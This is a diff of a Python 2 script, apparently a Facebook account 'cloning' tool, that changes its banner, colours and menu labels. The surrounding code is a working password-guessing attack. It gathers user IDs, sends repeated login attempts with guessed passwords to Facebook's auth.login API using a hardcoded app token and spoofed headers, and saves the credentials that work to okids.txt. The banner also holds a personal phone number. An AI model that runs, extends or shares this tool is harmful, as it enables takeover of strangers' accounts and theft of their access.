@@ -30,36 +30,34 @@ sim = random.randint(2e4, 4e4)
 header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT', 'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3','x-fb-connection-type': 'unknown','content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 logo = """
 
-\033[1;35m__  __ _____  
-\033[1;35m|  \/  |  __ \ 
-\033[1;35m| \  / | |__) |
-\033[1;35m| |\/| |  _  / 
-\033[1;35m| |  | | | \ \ 
-\033[1;35m|_|  |_|_|  \_\
-    
-\033[1;35m   ____________ ______ _  ______  
-\033[1;35m|___  /  ____|  ____| |/ / __ \ 
-\033[1;35m   / /| |__  | |__  | ' / |  | |
-\033[1;35m/ / |  __| |  __| |  <| |  | |
-\033[1;35m  / /__| |____| |____| . \ |__| |
-\033[1;35m /_____|______|______|_|\_\____/                                          
+
+\033[1;31m
+\033[1;31m________  ________  ________  ___  ____    ___    
+\033[1;31m|  __   _||_   __  ||_   __  ||_  ||_  _| .'   `.  
+\033[1;31m|_/  / /    | |_ \_|  | |_ \_|  | |_/ /  /  .-.  \ 
+\033[1;31m   .'.' _   |  _| _   |  _| _   |  __'.  | |   | | 
+\033[1;31m _/ /__/ | _| |__/ | _| |__/ | _| |  \ \_\  `-'  / 
+\033[1;31m|________||________||________||____||____|`.___.'  
+                                                   
+                                 
 \n\033[0m-----------------------------------------------
-\033[1;93mAuthor     \033[1;92m: MR ZEEKO
-\033[1;93mFacebook \033[1;92m: ZULFIQAR BALOCH
-\033[1;93mWhatsapp \033[1;92m: +923403233915
-\033[0m----------------------------------------------------
+---------------------------------------------------------------------------------------------]
+\033[1;93mAuthor     \033[1;96m: MR ZEEKO                          ]
+\033[1;93mFacebook \033[1;96m: ZULFIQAR BALOCH         ]
+\033[1;93mWhatsapp \033[1;96m: +923403233915              ]
+\033[0m--------------------------------------------------------------------------------]
 
 """
 def main():
     os.system('clear')
     print logo
     print ''
-    print ' [1].\x1b[1;97m Start Cloning'
+    print ' \x1b[1;92m[A]. Start Cloning'
     print ''
     log_sel()
 def log_sel():
-    select = raw_input('\x1b[1;97m SELECT: ')
-    if select == '1':
+    select = raw_input('\x1b[1;92m SELECT: ')
+    if select == 'A':
         menu()
     
     else:
@@ -75,17 +73,17 @@ def login():
         os.system('clear')
         print logo
         print ''
-        print ' \x1b[1;97m  \tFacebook Login Menu'
+        print ' \x1b[1;97m  \tToken Login Menu'
         print ''
         print ''
-        print ' \x1b[1;97m [A] LOGIN WITH TOKEN\n'
-        print ' \x1b[1;97m [0] EXIT \033[0m'
+        print ' \x1b[1;92m [A] LOGIN WITH TOKEN\n'
+        print ' \x1b[1;92m [0] EXIT \033[0m'
         print ''
         log_select()
 def log_select():
     global token
     sel = raw_input(' Choose an option : ')
-    if sel == '1':
+    if sel == 'c':
         log_fb()
     elif sel == 'A':
         token()
@@ -105,7 +103,7 @@ def log_fb():
     except (KeyError, IOError):
         print logo
         print ''
-        print '\tFacebook Email / Pass login'
+        print ''
         print ''
         uid = raw_input(' Email / id : ')
         passw = raw_input(' Password: ')
@@ -136,7 +134,7 @@ def token():
     except (KeyError, IOError):
         print logo
         print ''
-        print ' \x1b[1;97m  \t Login With Token '
+        print ' \x1b[1;92m  \t Login With Token '
         print ''
         token = raw_input('Paste Token Here : ')
         sav = open('access_token.txt', 'w')
@@ -220,20 +218,20 @@ def menu():
     print '   Welcome Dear: ' + name
     print ''
     print '\033[0m\033[0m'
-    print ' \x1b[1;92m[1]. Start Cloning  \n 2. Remove Token  \n 3. Back'
-    print ''
-    print ''
+    print ' \x1b[1;92m[A]. Start Cloning'
+    print ' \x1b[1;92m[B]. Dellete Token'
+    print ' \x1b[1;92m[C]. ZEEKO Back'
     menu_option()
 def menu_option():
     select = raw_input(' Choose Option : \x1b[0m')
-    if select == '1':
+    if select == 'A':
         crack()
-    elif select == '2':
+    elif select == 'B':
         os.system('rm -rf access_token.txt')
         print('Token Removed Sucessfully ')
         time.sleep(1)
         menu()
-    elif select == '3':
+    elif select == 'C':
         main()
     
     else:
@@ -254,8 +252,8 @@ def crack():
     os.system('clear')
     print logo
     print ''
-    print '1. \033[1;97mClone 3 Links \n 2. \033[1;97mClone Single id' 
-    print ''
+    print ' \033[1;92m[1]Clone 3 uid Cloning'
+    print ' \033[1;92m[2]Clone 1 uid Cloning'
     crack_select()
 def crack_select():
     select = raw_input('Choose An Option : ')
@@ -281,7 +279,7 @@ def crack_select():
                     id.append(uid + '|' + na)
             except KeyError:
                 print '\x1b[97;1m  Invalid Link / Account Private '
-            print '\033[1;97m   TOTAL IDS  : %s' % len(id)
+            print '\033[1;92m   TOTAL IDS  : %s' % len(id)
     elif select == '2':
         os.system('clear')
         print logo
@@ -313,7 +311,7 @@ def crack_select():
         print '\tSelect valid option'
         print ''
         crack_select()
-    print ' \x1b[1;97m  Brute Has Been Started'
+    print ' \x1b[1;92m  Cloning Has Been Started'
     print 45 * '_'
     print ''
     def main(arg):
@@ -327,13 +325,13 @@ def crack_select():
             data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass1 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
             q = json.loads(data)
             if 'access_token' in q:
-                print '\x1b[1;32m[ZEEKO_OK]\033[0m ' + uid + ' | ' + pass1 + '\x1b[0;96m'
+                print '\x1b[1;32m[OK]\033[0m ' + uid + ' | ' + pass1 + '\x1b[0;95m'
                 ok = open('okids.txt', 'a')
                 ok.write(uid + '|' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;35m[ZEEKO_CP] \033[0m' + uid + ' | ' + pass1 + '\x1b[0;96m'
+                print '\x1b[1;33m[CP] \033[0m' + uid + ' | ' + pass1 + '\x1b[0;95m'
                 cp = open('cpids.txt', 'a')
                 cp.write(uid + '|' + pass1 + '\n')
                 cp.close()
@@ -343,13 +341,13 @@ def crack_select():
                 data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass2 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                 q = json.loads(data)
                 if 'access_token' in q:
-                    print '\x1b[1;32m[ZEEKO_OK]\033[0m ' + uid + ' | ' + pass2 + '\x1b[0;96m'
+                    print '\x1b[1;32m[OK]\033[0m ' + uid + ' | ' + pass2 + '\x1b[0;95m'
                     ok = open('okids.txt', 'a')
                     ok.write(uid + '|' + pass2 + '\n')
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'www.facebook.com' in q['error_msg']:
-                    print '\x1b[1;35m[ZEEKO_CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;96m'
+                    print '\x1b[1;33m[CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;95m'
                     cp = open('cpids.txt', 'a')
                     cp.write(uid + '|' + pass2 + '\n')
                     cp.close()
@@ -359,13 +357,13 @@ def crack_select():
                     data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass3 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                     q = json.loads(data)
                     if 'access_token' in q:
-                        print '\x1b[1;32m[ZEEKO_OK]\033[0m ' + uid + ' | ' + pass3 + '\x1b[0;96m'
+                        print '\x1b[1;32m[OK]\033[0m ' + uid + ' | ' + pass3 + '\x1b[0;95m'
                         ok = open('okids.txt', 'a')
                         ok.write(uid + '|' + pass3 + '\n')
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'www.facebook.com' in q['error_msg']:
-                        print '\x1b[1;35m[ZEEKO_CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;96m' #
+                        print '\x1b[1;33m[CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;95m' #
                         cp = open('cpids.txt', 'a')
                         cp.write(uid + '|' + pass3 + '\n')
                         cp.close()
